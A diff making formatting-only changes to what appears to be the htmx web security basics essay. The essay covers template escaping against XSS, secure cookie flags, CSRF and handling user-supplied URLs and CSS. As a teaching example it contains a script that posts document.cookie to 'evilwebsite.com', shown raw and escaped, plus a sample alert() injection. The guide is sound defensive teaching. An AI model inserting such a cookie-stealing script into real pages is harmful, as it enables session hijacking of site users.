@@ -19,7 +19,7 @@ But have no fear! Writing web applications with HTML templates is a slightly dif
 
 ## Who is guide this for?
 
-These are web security basics with htmx, but they're (mostly) not htmx-specific—these concepts are important to know if you're putting *any* dynamic, user-generated content on the web.
+These are web security basics with htmx, but they're (mostly) not htmx-specific—these concepts are important to know if you're putting _any_ dynamic, user-generated content on the web.
 
 For this guide, you should already have a basic grasp of the semantics of the web, and be familiar with how to write a backend server (in any language). For instance, you should know not to create `GET` routes that can alter the backend state. We also assume that you're not doing anything super fancy, like making a website that hosts other people's websites. If you're doing anything like that, the security concepts you need to be aware of far exceed the scope of this guide.
 
@@ -58,7 +58,7 @@ But this is not:
 
 The reason for this is simple: htmx inserts the response from that route directly into the user's page. If the response has a malicious `<script>` inside it, that script can steal the user's data. When you don't control the route, you cannot guarantee that whoever does control the route won't add a malicious script.
 
-Fortunately, this is a very easy rule to follow. Hypermedia APIs (i.e. HTML) are [specific to the layout of your application](https://htmx.org/essays/hypermedia-apis-vs-data-apis/), so there is almost never any reason you'd *want* to insert someone else's HTML into your page. All you have to do is make sure you only call your own routes (htmx 2 will actually disable calling other domains by default).
+Fortunately, this is a very easy rule to follow. Hypermedia APIs (i.e. HTML) are [specific to the layout of your application](https://htmx.org/essays/hypermedia-apis-vs-data-apis/), so there is almost never any reason you'd _want_ to insert someone else's HTML into your page. All you have to do is make sure you only call your own routes (htmx 2 will actually disable calling other domains by default).
 
 Though it's not quite as popular these days, a common SPA pattern was to separate the frontend and backend into different repositories, and sometimes even to serve them from different URLs. This would require using absolute URLs in the frontend, and often, [disabling CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). With htmx (and, to be fair, modern React with Next.js) this is an anti-pattern.
 
@@ -72,35 +72,33 @@ When you send HTML to the user, all dynamic content must be escaped. Use a templ
 
 Fortunately, all template engines support escaping HTML, and most of them enable it by default. Below are just a few examples.
 
-| Language | Template Engine | Escapes HTML by default? |
-| ---- | ---- | ---- |
-| JavaScript | Nunjucks | Yes |
-| JavaScript | EJS | Yes, with `<%= %>` |
-| Python | DTL | Yes |
-| Python | Jinja | **Sometimes** (Yes, in Flask)|
-| Ruby | ERB | Yes, with `<%= %>` |
-| PHP | Blade | Yes |
-| Go | html/template | Yes |
-| Java | Thymeleaf | Yes |
-| Rust | Tera | Yes |
+| Language   | Template Engine | Escapes HTML by default?      |
+| ---------- | --------------- | ----------------------------- |
+| JavaScript | Nunjucks        | Yes                           |
+| JavaScript | EJS             | Yes, with `<%= %>`            |
+| Python     | DTL             | Yes                           |
+| Python     | Jinja           | **Sometimes** (Yes, in Flask) |
+| Ruby       | ERB             | Yes, with `<%= %>`            |
+| PHP        | Blade           | Yes                           |
+| Go         | html/template   | Yes                           |
+| Java       | Thymeleaf       | Yes                           |
+| Rust       | Tera            | Yes                           |
 
 The kind of vulnerability this prevents is often called a Cross-Site Scripting (XSS) attack, a term that is [broadly used](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#introduction) to mean the injection of any unexpected content into your webpage. Typically, an attacker uses your APIs to store malicious code in your database, which you then serve to your other users who request that info.
 
 For example, let's say you're building a dating site, and it lets users share a little bio about themselves. You'd render that bio like this, with `{{ user.bio }}` being the bio stored in the database:
 
 ```html
-<p>
-{{ user.bio }}
-</p>
+<p>{{ user.bio }}</p>
 ```
 
 If a malicious user wrote a bio with a script element in it—like one that sends the client's cookie to another website—then this HTML will get sent to every user who views that bio:
 
 ```html
 <p>
-<script>
-  fetch('evilwebsite.com', { method: 'POST', body: document.cookie })
-</script>
+  <script>
+    fetch('evilwebsite.com', { method: 'POST', body: document.cookie })
+  </script>
 </p>
 ```
 
@@ -110,7 +108,7 @@ Fortunately this one is so easy to fix that you can write the code yourself. Whe
 /**
  * Replace any characters that could be used to inject a malicious script in an HTML context.
  */
-export function escapeHtmlText (value) {
+export function escapeHtmlText(value) {
   const stringValue = value.toString()
   const entityMap = {
     '&': '&amp;',
@@ -120,7 +118,7 @@ export function escapeHtmlText (value) {
     "'": '&#x27;',
     '/': '&#x2F;',
     '`': '&grave;',
-    '=': '&#x3D;'
+    '=': '&#x3D;',
   }
 
   // Match any of the characters inside /[ ... ]/
@@ -133,9 +131,8 @@ This tiny JS function replaces `<` with `&lt;`, `"` with `&quot;`, and so on. Th
 
 ```html
 <p>
-&lt;script&gt;
-  fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, data: document.cookie })
-&lt;/script&gt;
+  &lt;script&gt; fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, data:
+  document.cookie }) &lt;/script&gt;
 </p>
 ```
 
@@ -160,6 +157,7 @@ This is an addendum to the template engine rule, but it's important enough to ca
 ```
 
 And, don't use user-defined attributes or tag names either:
+
 ```html
 <!-- Don't allow user-defined tag names -->
 <{{ user.tag }}></{{ user.tag }}>
@@ -174,17 +172,17 @@ And, don't use user-defined attributes or tag names either:
 <a>{{ user.name }}</a>
 ```
 
-CSS, JavaScript, and HTML attributes are ["dangerous contexts,"](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#dangerous-contexts) places where it's not safe to allow arbitrary user input, even if it's escaped. Escaping will protect you from some vulnerabilities here, but not all of them; the vulnerabilities are varied enough that it's safest to default to not doing *any* of these.
+CSS, JavaScript, and HTML attributes are ["dangerous contexts,"](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#dangerous-contexts) places where it's not safe to allow arbitrary user input, even if it's escaped. Escaping will protect you from some vulnerabilities here, but not all of them; the vulnerabilities are varied enough that it's safest to default to not doing _any_ of these.
 
-Inserting user-generated text directly into a script tag should never be necessary, but there *are* some situations where you might let users customize their CSS or customize HTML attributes. Handling those properly will be discussed down below.
+Inserting user-generated text directly into a script tag should never be necessary, but there _are_ some situations where you might let users customize their CSS or customize HTML attributes. Handling those properly will be discussed down below.
 
 ## Secure your cookies
 
 The best way to do authentication with htmx is using cookies. And because htmx encourages interactivity primarily through first-party HTML APIs, it is usually trivial to enable the browser's best cookie security features. These three in particular:
 
-* `Secure` - only send the cookie via HTTPS, never HTTP
-* `HttpOnly` - don't make the cookie available to JavaScript via `document.cookie`
-* `SameSite=Lax` - don't allow other sites to use your cookie to make requests, unless it's just a plain link
+- `Secure` - only send the cookie via HTTPS, never HTTP
+- `HttpOnly` - don't make the cookie available to JavaScript via `document.cookie`
+- `SameSite=Lax` - don't allow other sites to use your cookie to make requests, unless it's just a plain link
 
 To understand what these protect you against, let's go over the basics. If you come from JavaScript SPAs, where it's common to authenticate using the `Authorization` header, you might not be familiar with how cookies work. Fortunately they're very simple. (Please note: this is not an "authentication with htmx" tutorial, just an overview of cookie tokens generally)
 
@@ -220,11 +218,11 @@ Set-Cookie: token=asd8234nsdfp982; Secure; HttpOnly; SameSite=Lax
 
 So what do the options do?
 
-The first one, `Secure`, ensures that the browser will not send the cookie over an insecure HTTP connection, only a secure HTTPS connection. Sensitive info, like a user's login token, should *never* be sent over an insecure connection.
+The first one, `Secure`, ensures that the browser will not send the cookie over an insecure HTTP connection, only a secure HTTPS connection. Sensitive info, like a user's login token, should _never_ be sent over an insecure connection.
 
 The second option, `HttpOnly`, means that the browser will not expose the cookie to JavaScript, ever (i.e. it won't be in [`document.cookie`](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)). Even if someone is able to insert a malicious script, like in the `evilwebsite.com` example above, that malicious script cannot access the user's cookie or send it to `evilwebsite.com`. The browser will only attach the cookie when the request is made to the website the cookie came from.
 
-Finally, `SameSite=Lax` locks down an avenue for Cross-Site Request Forgery (CSRF) attacks, which is where an attacker tries to get the client's browser to make a malicious request to the `yourdomain.com` server—like a POST request. The `SameSite=Lax` setting tells the browser not to send the `yourdomain.com` cookie if the site that made the request isn't `yourdomain.com`—unless it's a straightforward `<a>` link navigating to your page. This is *mostly* browser default behavior now, but it's important to still set it directly.
+Finally, `SameSite=Lax` locks down an avenue for Cross-Site Request Forgery (CSRF) attacks, which is where an attacker tries to get the client's browser to make a malicious request to the `yourdomain.com` server—like a POST request. The `SameSite=Lax` setting tells the browser not to send the `yourdomain.com` cookie if the site that made the request isn't `yourdomain.com`—unless it's a straightforward `<a>` link navigating to your page. This is _mostly_ browser default behavior now, but it's important to still set it directly.
 
 In 2024, `SameSite=Lax` is [usually enough](https://security.stackexchange.com/questions/252300/do-i-still-need-a-csrf-token) to protect against CSRF, but there are [additional mitigations](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) you can consider as well for more sensitive or complicated cases.
 
@@ -242,7 +240,7 @@ Calling untrusted HTML APIs is lunacy. Never do this.
 
 There are cases where you might want to call someone else's JSON API from the client, and that's fine, because JSON cannot execute arbitrary scripts. In that case, you'll probably want to do something with that data to turn it into HTML. Don't use htmx to do that—use `fetch` and `JSON.parse()`; if the untrusted API pulls a fast one and returns HTML instead of JSON, `JSON.parse()` will just fail harmlessly.
 
-Keep in mind that the JSON you parse might have a *property* that is formatted as HTML, though:
+Keep in mind that the JSON you parse might have a _property_ that is formatted as HTML, though:
 
 ```json
 { "name": "<script>alert('Hahaha I am a script')</script>" }
@@ -259,12 +257,13 @@ Unlike calling untrusted HTML routes, there are a lot of good reasons to let use
 What if, say, you want to let users link to an image?
 
 ```html
-<img src="{{ user.fav_img }}" alt="{{ user.fav_img_alt }}">
+<img src="{{ user.fav_img }}" alt="{{ user.fav_img_alt }}" />
 ```
 
 Or link to their personal website?
+
 ```html
-<a href="{{ user.fav_link }}">
+<a href="{{ user.fav_link }}"></a>
 ```
 
 The default "escape everything" approach escapes forward slashes, so it will bork user-submitted URLs.
@@ -272,7 +271,7 @@ The default "escape everything" approach escapes forward slashes, so it will bor
 You can fix this in a couple of ways. The simplest, and safest, trick is to let users customize these values, but don't let them define the literal text. In the image example, you might upload the image to your own server (or S3 bucket, or the like), generate the link yourself, and then include it, unescaped. In nunjucks, you use the [safe](https://mozilla.github.io/nunjucks/templating.html#safe) function:
 
 ```html
-<img src="{{ user.fav_img_s3_url | safe }}" alt="{{ user.fav_img_alt }}">
+<img src="{{ user.fav_img_s3_url | safe }}" alt="{{ user.fav_img_alt }}" />
 ```
 
 Yes, you're including unescaped content, but it's a link that you generated, so you know it's safe.
@@ -289,9 +288,9 @@ h1 { color: 'blue'; }
 
 In that example, the user can set `favorite_color` to whatever they like, but it's never going to be anything but red or blue. A less trivial example might ensure that only properly-formatted hex codes can be entered, using a regex. You get the idea.
 
-Depending on what kind of customization you're supporting, securing it might be relatively easy, or quite difficult. Some attributes are ["safe sinks,"](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#safe-sinks) which means that their values will never be interpreted as code; these are quite easy to secure. If you're going to include dynamic input in ["dangerous contexts,"](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#dangerous-contexts) you need to research *what* is dangerous about those contexts, and ensure that that kind of input won't make it into the document.
+Depending on what kind of customization you're supporting, securing it might be relatively easy, or quite difficult. Some attributes are ["safe sinks,"](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#safe-sinks) which means that their values will never be interpreted as code; these are quite easy to secure. If you're going to include dynamic input in ["dangerous contexts,"](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#dangerous-contexts) you need to research _what_ is dangerous about those contexts, and ensure that that kind of input won't make it into the document.
 
-If you want to let users link to arbitrary websites or images, for instance, that's a lot more complicated. First, make sure to put the attributes inside quotes (most people do this anyway). Then you will need to do something like write a custom escaping function that escapes everything *but* forward slashes (and possibly ampersands), so the link will work properly.
+If you want to let users link to arbitrary websites or images, for instance, that's a lot more complicated. First, make sure to put the attributes inside quotes (most people do this anyway). Then you will need to do something like write a custom escaping function that escapes everything _but_ forward slashes (and possibly ampersands), so the link will work properly.
 
 But even if you do that correctly, you are introducing some new security challenges. That image link can be used to track your users, since your users will request it directly from someone else's server. Maybe you're fine with that, maybe you include other mitigations. The important part is that you are aware that introducing this level of customization comes with a more difficult security model, and if you don't have the bandwidth to research and test it, you shouldn't do it.
 
@@ -313,13 +312,13 @@ This is not one of the golden rules because it's not as easy to apply universall
 
 You might reasonably wonder: if I didn't have to know these things when I was building SPAs, isn't htmx a step back in security? We would challenge both parts of that statement.
 
-This article is not intended to be a defense of htmx's security properties, but there are a lot of areas where hypermedia applications are, by default, a lot more secure than JSON-based frontends. HTML APIs only send back the information that's supposed to be rendered—it's a lot easier for unintended data to "hide" in a JSON response and leak to the user. Hypermedia APIs also don't lend themselves to implementing a generalized query language, like GraphQL, on the client, which [require a *massively* more complicated security model](https://intercoolerjs.org/2016/02/17/api-churn-vs-security.html). Flaws of all kinds hide in your application's complexity; hypermedia applications are, generally speaking, less complex, and therefore easier to secure.
+This article is not intended to be a defense of htmx's security properties, but there are a lot of areas where hypermedia applications are, by default, a lot more secure than JSON-based frontends. HTML APIs only send back the information that's supposed to be rendered—it's a lot easier for unintended data to "hide" in a JSON response and leak to the user. Hypermedia APIs also don't lend themselves to implementing a generalized query language, like GraphQL, on the client, which [require a _massively_ more complicated security model](https://intercoolerjs.org/2016/02/17/api-churn-vs-security.html). Flaws of all kinds hide in your application's complexity; hypermedia applications are, generally speaking, less complex, and therefore easier to secure.
 
 You also need to know about XSS attacks if you're putting dynamic content on the web, period. A developer who doesn't understand how XSS works won't understand what's dangerous about using React's [`dangerouslySetInnerHTML`](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)—and they'll go ahead and set it the first time they need to render rich user-generated text. It is the library's responsibility to make those security basics as easy to find as possible; it has always been the developer's responsibility to learn and follow them.
 
-This article is organized to making securing your htmx application a "pit of success"—follow these simple rules and you are very unlikely to code an XSS vulnerability. But it's impossible to write a library that's going to be secure in the hands of a developer who refuses to learn *anything* about security, because security is about controlling access to information, and it will always be the human's job to explain to the computer precisely who has access to what information.
+This article is organized to making securing your htmx application a "pit of success"—follow these simple rules and you are very unlikely to code an XSS vulnerability. But it's impossible to write a library that's going to be secure in the hands of a developer who refuses to learn _anything_ about security, because security is about controlling access to information, and it will always be the human's job to explain to the computer precisely who has access to what information.
 
-Writing secure web applications is *hard*. There are plenty of easy pitfalls related to routing, database access, HTML templating, business logic, and more. And yet, if security is only the domain of security experts, then only security experts should be making web applications. Maybe that should be the case! But if only security experts are making web applications, they definitely know how to use a template engine correctly, so htmx will be no trouble for them.
+Writing secure web applications is _hard_. There are plenty of easy pitfalls related to routing, database access, HTML templating, business logic, and more. And yet, if security is only the domain of security experts, then only security experts should be making web applications. Maybe that should be the case! But if only security experts are making web applications, they definitely know how to use a template engine correctly, so htmx will be no trouble for them.
 
 For everyone else:
 
